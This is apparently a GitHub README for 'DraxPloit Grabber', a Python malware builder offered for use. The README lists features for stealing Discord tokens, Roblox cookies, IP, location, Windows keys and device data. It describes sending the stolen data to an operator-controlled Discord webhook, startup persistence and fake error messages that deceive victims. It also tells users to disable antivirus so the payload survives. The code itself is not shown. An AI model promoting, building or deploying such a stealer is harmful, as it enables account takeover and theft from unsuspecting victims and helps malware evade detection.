# DraxPloit Grabber v1.42

Data Stealer written in **Python**

*enjoy the script fuggas*

#### This program was made for educational purposes only. I do not condone or promote and illegal acts that can be reproduced with my program! :x:

## Features

- Builder (does all the coding for you)
- Steals IP, City etc.
- Grabs Discord Token
- Roblox Cookie stealer
- Startup infection
- [**NEW**] Default and Custom Fake Error message
- No popups in .exe file!
- More to be added! :heavy_plus_sign:

### Requirements

* Newest [Python](https://www.python.org) version
* The code in this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)

### Installing

1. Install the files of this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)
2. Extract the .zip file in the desired directory.
3. Run "setup.bat" (located in the folder) and wait until everything's installed
4. Run "start.bat"
5. Configure your file (see "Usage" for more information on how to set your file up)
6. Enjoy!

### Usage

1. Create a Discord Server and go to server settings
2. Go to "Integrations" and click on "Create Webhook"
3. Set a webhook name and the specified text channel
4. Copy the Webhook URL (!!!)
5. Open DraxPloit Grabber and paste the webhook URL
6. Customize your file further
7. Your file is ready for usage!

<img src="https://i.ibb.co/f4Twmvf/Screenshot-9.png" width="500" height=auto>

### Explanation
**If you are new to exploiting, this might be in your interest**:  
When running the "**setup.bat**" file, a black window opens. Don't worry, this is just normal procedure even though it may look *malicious* at first glance. There will be text popping up in white colors. The "**setup.bat**" file installs all required libraries from "**requirements.txt**". Still, you mustn't delete the "**requirements.txt**" at all times. The builder still uses this file on execution!  
The same with "**start.bat**". Creating a software which has actual UI is really hard and honestly I am too lazy to do that. So that is why you configure your file in a black window (as seen in the picture above).  
You also might find the "**upx.exe**" file in the "upx" folder suspicious. But basically UPX (***Ultimate Packager for Executables***) is a well-known program. If you don't trust the one that's already in this repository feel free to install the original one from their own website and replace it with the already existing one.  
Another thing is the compilation from **.py** to **.exe**. There will be files created in the folder and it may seem suspicious but this is needed to pack the Python file into one. There are tons of libraries that need to be packed, so give it time.  

## Help

### 1. Python allegedly "not found", Problems with PATH.

A common problem lots of users have with this program is not caused by me or my program, it's caused by Python. When installing Python you have to select the option "Add python.exe to PATH". Unfortunately this box is **NOT** ticked by default. If you already have Python installed, there's still a way to avoid a reinstallation. You can look up a tutorial on how to manually extend the Python PATHS. But here is a short instruction:  
  
1. Press windows key + R and type "sysdm.cpl" in the box that will pop up and press Enter.
2. Go to the Tab "Advanced" and click on the "Enviroment variables" button in the bottom right of the window.
3. On the upper box you should see the "User environment variables". Press on "New".
4. Put "Path" as the name and switch to the second bar and paste in the following:
  
```C:\Users\YOUR_NAME_HERE\AppData\Local\Programs\Python\Python311;C:\Users\YOUR_NAME_HERE\AppData\Local\Programs\Python\Python311\;C:\Users\YOUR_NAME_HERE\AppData\Local\Programs\Python\Python311\Scripts;C:\Users\YOUR_NAME_HERE\AppData\Local\Programs\Python\Python311\Scripts\```
   
5. Now replace every part called "YOUR_NAME_HERE", with the Windows user you are currently working with.
6. Do not forget to press "OK"! Else you will need to redo everything!
7. If you still have problems with DraxPloit Logger please join my Discord or add my user. You can find the needed information in the "Authors" section.

### 2. File is not there or not working properly when tested?

This can obviously be a bug, if there is an error shown, please contact me so I can improve my software. Otherwise, your scripts (mostly the .exe's) won't work because of your antivirus. As my scripts are not 100% undetected antivirusses might think that you installed a virus (even though you created it) and break it/parts of it or even delete it. To fix this, simply turn off your Antivirus and then create your file or add the file as extension so it doesn't get locked.  

## Authors

* [**Drax**](https://github.com/DraxFM) - *DraxPloit Grabber*

**Discord: [Drax#5934](https://discord.com/users/654343206275907585)**

Need help? Join the [**Discord**](https://discord.gg/sEXECdC3Et)!

Inspiration to start with python exploiting: [**KSCHdsc**](https://github.com/KSCHdsc)

## Changelog

03/07/2023: Fixed startup infection  
03/06/2023: Added a banner to the program  
03/05/2023: Added Device Name and Device User logging  
03/05/2023: Big update: lots of bugfixes, UI changes, Fake error message system added  
03/05/2023: Minor bugfixes, optimization + new webhook test feature  
02/28/2023: Added badass token grabber supporting multiple browsers  
02/23/2023: Fixed fatal error  
02/20/2023: Added profile picture to webhook  
02/13/2023: Added Windows-Key, Windows-Version and UUID to information logger  
02/13/2023: Added Ascii-Art in Builder  
02/12/2023: Added startup infection  
02/12/2023: Fixed compilation process to exe  
02/12/2023: Released program  

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
